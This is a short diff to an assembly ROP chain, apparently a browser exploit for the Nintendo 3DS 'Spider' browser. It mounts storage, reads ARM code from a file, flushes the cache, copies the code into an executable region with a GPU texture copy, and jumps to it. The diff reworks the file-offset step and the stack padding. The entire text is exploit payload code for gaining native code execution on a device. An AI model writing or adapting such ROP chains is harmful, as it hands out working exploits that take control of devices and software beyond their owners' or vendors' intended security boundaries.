@@ -13,13 +13,14 @@
 _start:
 	rop_fs_mount(DMC)
 	rop_file_open(THIS, FileName, FILE_READ)
-	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, SPIDER_ARM_CODE_SIZE+SPIDER_ARM_CODE_OFFSET)
-	rop_flush_data_cache(BUFFER_LOC+SPIDER_ARM_CODE_OFFSET, SPIDER_ARM_CODE_SIZE)
-	rop_gx_texture_copy(BUFFER_LOC+SPIDER_ARM_CODE_OFFSET, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
+	rop_store(THIS+4, SPIDER_ARM_CODE_OFFSET)
+	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
+	rop_flush_data_cache(BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
+	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
 	rop_jump_arm
 @.org 0x0F4, GARBAGE
-	.fill 9, 4, GARBAGE
+	.fill 3, 4, GARBAGE
 	.word ROP_LOC+_start+0x8C
 @.org 0x128, GARBAGE
 	.fill 12, 4, GARBAGE
